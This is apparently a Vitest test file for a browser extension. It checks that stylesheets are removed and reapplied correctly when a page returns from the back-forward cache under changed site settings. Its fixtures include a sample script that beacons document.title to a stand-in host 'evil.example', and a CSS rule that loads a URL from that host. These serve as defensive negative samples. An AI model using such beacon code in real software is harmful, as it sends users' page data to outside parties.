/**
 * The stylesheet a page keeps in the back-forward cache (#80, #50).
 *
 * Loads the real src/background/index.ts through test-browser.ts and sends the
 * navigation events the browser sends when a cached page is shown again.
 */

import { beforeEach, describe, expect, it } from 'vitest'
import { DEFAULT_SETTINGS } from '@shared/types'
import { createHarness, cssTransform, type Harness } from './test-browser'

const TAB = 1
const SHOP = 'https://shop.example.com/cart'
const BG = 'a { background: url(/bg.png) }'
const GOOD_JS = "document.querySelector('aside').style.display = 'none'"
/** Copies navigator into a variable, which the analyser refuses. */
const BAD_JS = "const n = navigator; n.sendBeacon('https://evil.example/', document.title)"
const EVIL_CSS = 'a { background: url(https://evil.example/t) }'

const sameOrigin = { ...DEFAULT_SETTINGS, cssUrlPolicy: { 'shop.example.com': 'same-origin' as const } }

let h: Harness
const settle = () => new Promise((resolve) => setTimeout(resolve, 20))
const commit = (url: string, qualifiers?: string[]) =>
  h.listeners.get('browser.webNavigation.onCommitted')!({
    frameId: 0,
    tabId: TAB,
    url,
    ...(qualifiers ? { transitionQualifiers: qualifiers } : {}),
  })
const inserted = (needle: string) => h.calls.insertCSS.filter((c) => c.css.includes(needle))
const removed = (needle: string) => h.calls.removeCSS.filter((c) => c.css.includes(needle))

/** Boots with the transforms and settings stored and the tab on `url`. */
async function start(transforms: object[], settings: object = DEFAULT_SETTINGS, url = SHOP) {
  h.local.set('transforms', transforms)
  h.local.set('settings', settings)
  h.tabUrls.set(TAB, url)
  h.contentReply = (message) =>
    message.type === 'ping' ? true : { type: 'health-check-result', states: [] }
  await h.boot()
}

async function ask(message: unknown): Promise<any> {
  const reply = await h.onMessage(message)
  if (!reply.ok) throw new Error(reply.error.message)
  return reply.data
}

beforeEach(() => {
  h = createHarness()
  h.hasUserScripts = true
})

const shopCss = cssTransform({ id: 'c1', match: 'shop.example.com/*', code: BG })

describe('a page restored from the back-forward cache after its site setting was tightened (#80, #50)', () => {
  const ELSEWHERE = 'https://elsewhere.example.org/'

  /** Loads the shop page under a setting that allows its CSS, then leaves it. */
  async function leaveShopPage() {
    await start([shopCss], sameOrigin)
    await commit(SHOP)
    expect(inserted('url(/bg.png)')).toHaveLength(1)
    await commit(ELSEWHERE)
  }

  it('takes the stylesheet the page kept out, and applies nothing the setting refuses', async () => {
    await leaveShopPage()
    const kept = inserted('url(/bg.png)')[0]!.css
    h.local.set('settings', DEFAULT_SETTINGS) // the site's setting was removed while the page was cached
    await commit(SHOP, ['forward_back'])
    expect(h.calls.removeCSS.map((c) => c.css)).toEqual([kept])
    expect(inserted('url(/bg.png)')).toHaveLength(1) // only the first insert
  })

  it('removes the old stylesheet and inserts the current one when the setting did not change', async () => {
    await leaveShopPage()
    await commit(SHOP, ['forward_back'])
    expect(removed('url(/bg.png)')).toHaveLength(1)
    expect(inserted('url(/bg.png)')).toHaveLength(2)
  })

  it('removes nothing when the page is loaded again and not restored (control)', async () => {
    await leaveShopPage()
    h.local.set('settings', DEFAULT_SETTINGS)
    await commit(SHOP)
    expect(h.calls.removeCSS).toEqual([])
  })

  it('files the applied string per address, and discards it when the tab closes', async () => {
    await leaveShopPage()
    expect(h.session.get(`wa-applied-archive-${TAB}`)).toBeDefined()
    await h.listeners.get('browser.tabs.onRemoved')!(TAB)
    expect(h.session.get(`wa-applied-archive-${TAB}`)).toBeUndefined()
  })
})
